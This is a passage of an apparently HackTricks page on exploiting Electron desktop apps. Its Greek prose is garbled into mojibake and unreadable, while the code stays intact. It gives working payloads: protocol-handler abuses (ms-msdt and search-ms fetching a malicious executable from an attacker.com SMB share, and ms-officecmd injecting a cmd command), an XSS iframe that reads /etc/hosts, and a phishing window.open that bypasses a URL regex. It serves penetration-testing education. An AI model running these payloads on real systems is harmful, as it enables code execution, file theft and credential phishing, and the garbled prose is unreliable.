Î‘Ï…Ï„Î¿Î¯ Î¿Î¹ Î±ÎºÏÎ¿Î±Ï„Î­Ï‚ ÎµÎ¯Î½Î±Î¹ **Ï…Ï€ÎµÏÎºÎ±Î»Ï…Î¼Î¼Î­Î½Î¿Î¹ Î±Ï€ÏŒ Ï„Î·Î½ ÎµÏ€Î¹Ï„ÏÎ±Ï€Î­Î¶Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î®** Î³Î¹Î± Î½Î± Ï…Î»Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î· Î´Î¹ÎºÎ® Ï„Î¿Ï…Ï‚ **ÎµÏ€Î¹Ï‡ÎµÎ¹ÏÎ·Î¼Î±Ï„Î¹ÎºÎ® Î»Î¿Î³Î¹ÎºÎ®**. Î— ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î±Î¾Î¹Î¿Î»Î¿Î³ÎµÎ¯ Î±Î½ Î­Î½Î±Ï‚ Ï€Î»Î¿Î·Î³Î·Î¼Î­Î½Î¿Ï‚ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿Ï‚ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Î½Î¿Î¹Ï‡Ï„ÎµÎ¯ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¬ Î® ÏƒÎµ Î­Î½Î±Î½ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÏŒ Ï†Ï…Î»Î»Î¿Î¼ÎµÏ„ÏÎ·Ï„Î® Î¹ÏƒÏ„Î¿Ï. Î‘Ï…Ï„Î® Î· Î±Ï€ÏŒÏ†Î±ÏƒÎ· ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î»Î±Î¼Î²Î¬Î½ÎµÏ„Î±Î¹ Î¼Î­ÏƒÏ‰ Î¼Î¹Î±Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚, `openInternally`. Î‘Î½ Î±Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ `false`, Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ Î¿ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿Ï‚ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Î½Î¿Î¹Ï‡Ï„ÎµÎ¯ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ¬, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `shell.openExternal`.

**Î•Î´Ï ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Î±Ï€Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚ ÏˆÎµÏ…Î´Î¿ÎºÏÎ´Î¹ÎºÎ±Ï‚:**

![https://miro.medium.com/max/1400/1\*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (261).png>)

![https://miro.medium.com/max/1400/1\*ZfgVwT3X1V\_UfjcKaAccag.png](<../../../.gitbook/assets/image (963).png>)

ÎŸÎ¹ ÎºÎ±Î»ÏÏ„ÎµÏÎµÏ‚ Ï€ÏÎ±ÎºÏ„Î¹ÎºÎ­Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï„Î¿Ï… Electron JS Ï€ÏÎ¿ÎµÎ¹Î´Î¿Ï€Î¿Î¹Î¿ÏÎ½ ÎºÎ±Ï„Î¬ Ï„Î·Ï‚ Î±Ï€Î¿Î´Î¿Ï‡Î®Ï‚ Î¼Î· Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿Ï… Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï… Î¼Îµ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `openExternal`, ÎºÎ±Î¸ÏÏ‚ Î±Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ RCE Î¼Î­ÏƒÏ‰ Î´Î¹Î±Ï†ÏŒÏÏ‰Î½ Ï€ÏÏ‰Ï„Î¿ÎºÏŒÎ»Î»Ï‰Î½. Î¤Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¬ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ Ï€ÏÏ‰Ï„ÏŒÎºÎ¿Î»Î»Î± Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î½ RCE. Î“Î¹Î± Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¯Ï‚ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎºÎ±Î¹ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ ÎµÎ¾Î·Î³Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¸Î­Î¼Î±, Î¼Ï€Î¿ÏÎµÎ¯ ÎºÎ±Î½ÎµÎ¯Ï‚ Î½Î± Î±Î½Î±Ï„ÏÎ­Î¾ÎµÎ¹ [ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€Î·Î³Î®](https://positive.security/blog/url-open-rce#windows-10-19042), Î· Î¿Ï€Î¿Î¯Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï€ÏÏ‰Ï„Î¿ÎºÏŒÎ»Î»Ï‰Î½ Windows Î¹ÎºÎ±Î½Î¬ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ½ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±.

**Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Ï€ÏÏ‰Ï„Î¿ÎºÏŒÎ»Î»Ï‰Î½ Windows Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½:**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## Î‘Î½Î¬Î³Î½Ï‰ÏƒÎ· Î•ÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏÎ½ Î‘ÏÏ‡ÎµÎ¯Ï‰Î½: XSS + contextIsolation

**Î— Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… `contextIsolation` ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Ï‰Î½ `<webview>` tags**, Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î± `<iframe>`, Î³Î¹Î± Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· ÎºÎ±Î¹ ÎµÎ¾Î±Î³Ï‰Î³Î® Ï„Î¿Ï€Î¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½. ÎˆÎ½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Ï€ÏÏ‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î³Î¹Î± Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½:

![](<../../../.gitbook/assets/1 u1jdRYuWAEVwJmf\_F2ttJg (1).png>)

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î¼Î¹Î± Î¬Î»Î»Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± **Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï…** ÎºÎ¿Î¹Î½Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹, ÎµÏ€Î¹ÏƒÎ·Î¼Î±Î¯Î½Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± ÎºÏÎ¯ÏƒÎ¹Î¼Î· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ·Ï‚ Ï„Î¿Ï€Î¹ÎºÏÎ½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÏƒÎµ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Electron desktop. Î‘Ï…Ï„ÏŒ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® ÎµÎ½ÏŒÏ‚ script Î³Î¹Î± Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ ÎºÎ±Î¹ Ï„Î·Î½ ÎµÎ¾Î±Î³Ï‰Î³Î® Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½:
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + Î Î±Î»Î¹ÏŒÏ‚ Chromium**

Î‘Î½ Î¿ **chromium** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ **Ï€Î±Î»Î¹ÏŒÏ‚** ÎºÎ±Î¹ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ **Î³Î½Ï‰ÏƒÏ„Î­Ï‚** **ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚** ÏƒÎµ Î±Ï…Ï„ÏŒÎ½, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± **ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ RCE Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ XSS**.\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· **Î³ÏÎ±Ï†Î·**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing Î¼Î­ÏƒÏ‰ Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ·Ï‚ regex ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¿Ï URL**

Î¥Ï€Î¿Î¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ Î²ÏÎ®ÎºÎ±Ï„Îµ Î­Î½Î± XSS Î±Î»Î»Î¬ **Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ RCE Î® Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î±**, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± **ÎºÎ»Î­ÏˆÎµÏ„Îµ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î¼Î­ÏƒÏ‰ phishing**.

Î ÏÏÏ„Î± Î±Ï€' ÏŒÎ»Î±, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¹ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î¿Î¯Î¾ÎµÏ„Îµ Î¼Î¹Î± Î½Î­Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL, ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ JS ÏƒÏ„Î¿ front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Î— ÎºÎ»Î®ÏƒÎ· ÏƒÏ„Î¿ **`openInternally`** Î¸Î± Î±Ï€Î¿Ï†Î±ÏƒÎ¯ÏƒÎµÎ¹ Î±Î½ Ï„Î¿ **link** Î¸Î± **Î±Î½Î¿Î¯Î¾ÎµÎ¹** ÏƒÏ„Î¿ **Ï€Î±ÏÎ¬Î¸Ï…ÏÎ¿ ÎµÏ€Î¹Ï†Î¬Î½ÎµÎ¹Î±Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** ÎºÎ±Î¸ÏÏ‚ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± link Ï€Î¿Ï… Î±Î½Î®ÎºÎµÎ¹ ÏƒÏ„Î·Î½ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î±, **Î®** Î±Î½ Î¸Î± Î±Î½Î¿Î¯Î¾ÎµÎ¹ ÏƒÏ„Î¿Î½ **Ï†Ï…Î»Î»Î¿Î¼ÎµÏ„ÏÎ·Ï„Î® Ï‰Ï‚ Ï€ÏŒÏÎ¿Ï‚ Ï„ÏÎ¯Ï„Î¿Ï… Î¼Î­ÏÎ¿Ï…Ï‚**.

Î£Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Î· **regex** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ **ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÎµ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹Ï‚** (Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, **Î¼Î· Î´Î¹Î±Ï†ÎµÏÎ³Î¿Î½Ï„Î±Ï‚ Ï„Î¹Ï‚ Ï„ÎµÎ»ÎµÎ¯ÎµÏ‚ Ï„Ï‰Î½ Ï…Ï€Î¿Ï„Î¿Î¼Î­Ï‰Î½**), Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Ï„Î¿ XSS Î³Î¹Î± Î½Î± **Î±Î½Î¿Î¯Î¾ÎµÎ¹ Î­Î½Î± Î½Î­Î¿ Ï€Î±ÏÎ¬Î¸Ï…ÏÎ¿ Ï„Î¿ Î¿Ï€Î¿Î¯Î¿** Î¸Î± Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Ï…Ï€Î¿Î´Î¿Î¼Î® Ï„Î¿Ï… ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï… **Î¶Î·Ï„ÏÎ½Ï„Î±Ï‚ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±** Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **Î•ÏÎ³Î±Î»ÎµÎ¯Î±**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³Î¹Î± Ï„Î·Î½ Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· ÎºÎ±ÎºÏÎ½ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ ÎºÎ±Î¹ Î±Î½Ï„Î¹Î±Î½Î±ÏƒÏ†Î±Î»Î¹ÏƒÏ„Î¹ÎºÏÎ½ Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ ÏƒÎµ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÏƒÎµ Electron.
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î±Î½Î¿Î¹Ï‡Ï„Î¿Ï ÎºÏÎ´Î¹ÎºÎ± Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î¿ Î³Î¹Î± Ï„Î¿ VS Code Î³Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Electron Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ Electronegativity.
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î³Î¹Î± ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Ï„ÏÎ¯Ï„Ï‰Î½.
* [**Electro.ng**](https://electro.ng/): Î ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï„Î¿ Î±Î³Î¿ÏÎ¬ÏƒÎµÏ„Îµ.

## Î•ÏÎ³Î±ÏƒÏ„Î®ÏÎ¹Î±

Î£Ï„Î¿ [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± ÎµÏÎ³Î±ÏƒÏ„Î®ÏÎ¹Î¿ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎµÏ…Î¬Î»Ï‰Ï„Ï‰Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³ÏÎ½ Electron.

ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Ï€Î¿Ï… Î¸Î± ÏƒÎ±Ï‚ Î²Î¿Î·Î¸Î®ÏƒÎ¿Ï…Î½ Î¼Îµ Ï„Î¿ ÎµÏÎ³Î±ÏƒÏ„Î®ÏÎ¹Î¿:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î­ÏÎµÏ…Î½ÎµÏ‚ ÎºÎ±Î¹ Î±Î½Î±Ï†Î¿ÏÎ­Ï‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± Ï„Î¿Ï… Electron ÏƒÏ„Î¿ [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
